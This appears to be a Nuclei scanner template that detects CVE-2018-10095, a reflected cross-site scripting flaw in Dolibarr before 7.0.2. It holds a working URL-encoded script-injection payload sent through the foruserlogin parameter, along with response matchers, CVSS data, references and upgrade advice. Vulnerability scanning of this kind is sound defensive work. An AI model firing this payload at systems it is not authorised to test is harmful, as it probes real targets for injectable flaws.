http:
- matchers:
  - part: body
    type: word
    words:
    - </script><script>alert(document.domain)</script>
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/dolibarr/adherents/cartes/carte.php?&mode=cardlogin&foruserlogin=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&model=5160&optioncss=print'
id: CVE-2018-10095
info:
  author: pikpikcu
  classification:
    cpe: cpe:2.3:a:dolibarr:dolibarr:*:*:*:*:*:*:*:*
    cve-id: CVE-2018-10095
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.97891
    epss-score: 0.53955
  description: 'Dolibarr before 7.0.2  is vulnerable to cross-site scripting and allows
    remote attackers to inject arbitrary web script or HTML via the foruserlogin parameter
    to adherents/cartes/carte.php.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary script code in the context of the victim''s browser, potentially
    leading to session hijacking, defacement, or theft of sensitive information.

    '
  metadata:
    max-request: 1
    product: dolibarr
    vendor: dolibarr
  name: Dolibarr <7.0.2 - Cross-Site Scripting
  reference:
  - https://sysdream.com/news/lab/2018-05-21-cve-2018-10095-dolibarr-xss-injection-vulnerability/
  - https://github.com/Dolibarr/dolibarr/commit/1dc466e1fb687cfe647de4af891720419823ed56
  - https://github.com/Dolibarr/dolibarr/blob/7.0.2/ChangeLog
  - https://nvd.nist.gov/vuln/detail/CVE-2018-10095
  - http://www.openwall.com/lists/oss-security/2018/05/21/3
  remediation: 'Upgrade to Dolibarr version 7.0.2 or later to mitigate this vulnerability.

    '
  severity: medium
  tags: cve2018,cve,xss,dolibarr,vuln
